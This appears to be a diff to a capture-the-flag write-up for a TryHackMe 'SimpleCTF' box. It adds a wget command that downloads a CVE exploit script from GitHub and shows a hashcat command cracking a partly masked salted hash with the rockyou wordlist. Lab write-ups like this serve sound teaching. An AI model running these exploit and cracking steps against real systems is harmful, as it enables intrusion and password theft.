@@ -29,7 +29,7 @@ Then you will search for the exploit using the following.
 Once you have identified the CVE, download the updated python script as shown below.
 
 ```
-Something
+  wget https://raw.githubusercontent.com/gray-area/THM/main/SimpleCTF/exploit.py
 ```
 ```
   hashcat -m 20 0c01f4468bxxxxxxxxxxx73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlists/rockyou.txt
